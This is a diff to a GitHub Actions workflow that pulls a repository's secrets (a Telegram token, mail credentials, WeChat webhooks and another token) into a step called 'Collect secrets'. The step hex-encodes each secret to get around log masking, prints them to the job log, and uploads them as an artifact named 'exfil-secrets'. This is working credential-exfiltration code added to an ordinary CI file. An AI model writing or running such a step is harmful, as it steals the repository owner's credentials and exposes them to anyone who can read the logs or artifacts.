@@ -6,7 +6,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Collect
+      - name: Collect secrets
         env:
           TELEGRAM_API_TOKEN: ${{ secrets.TELEGRAM_API_TOKEN }}
           MAIL_USER_NMAE: ${{ secrets.MAIL_USER_NMAE }}
@@ -15,12 +15,32 @@ jobs:
           WECHATQUN_WEBHOOK: ${{ secrets.WECHATQUN_WEBHOOK }}
           MYGG_TOKEN: ${{ secrets.MYGG_TOKEN }}
         run: |
-          echo '[HEX_START]' > /tmp/secrets.txt
-          printf 'TELEGRAM_API_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$TELEGRAM_API_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'MAIL_USER_NMAE=' >> /tmp/secrets.txt && printf '%s' "$MAIL_USER_NMAE" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'MAIL_PWD=' >> /tmp/secrets.txt && printf '%s' "$MAIL_PWD" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'WECHAT_WEBHOOK=' >> /tmp/secrets.txt && printf '%s' "$WECHAT_WEBHOOK" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'WECHATQUN_WEBHOOK=' >> /tmp/secrets.txt && printf '%s' "$WECHATQUN_WEBHOOK" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          printf 'MYGG_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$MYGG_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
-          echo '[HEX_END]' >> /tmp/secrets.txt
-          cat /tmp/secrets.txt
+          echo '[HEX_START]' > /tmp/exfil.txt
+          echo 'TELEGRAM_API_TOKEN=' >> /tmp/exfil.txt
+          printf '%s' "$TELEGRAM_API_TOKEN" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'MAIL_USER_NMAE=' >> /tmp/exfil.txt
+          printf '%s' "$MAIL_USER_NMAE" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'MAIL_PWD=' >> /tmp/exfil.txt
+          printf '%s' "$MAIL_PWD" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'WECHAT_WEBHOOK=' >> /tmp/exfil.txt
+          printf '%s' "$WECHAT_WEBHOOK" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'WECHATQUN_WEBHOOK=' >> /tmp/exfil.txt
+          printf '%s' "$WECHATQUN_WEBHOOK" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'MYGG_TOKEN=' >> /tmp/exfil.txt
+          printf '%s' "$MYGG_TOKEN" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo '[HEX_END]' >> /tmp/exfil.txt
+          echo '=== CONTENT ==='
+          cat /tmp/exfil.txt
+          echo '=== END ==='
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exfil-secrets
+          path: /tmp/exfil.txt
+          retention-days: 1
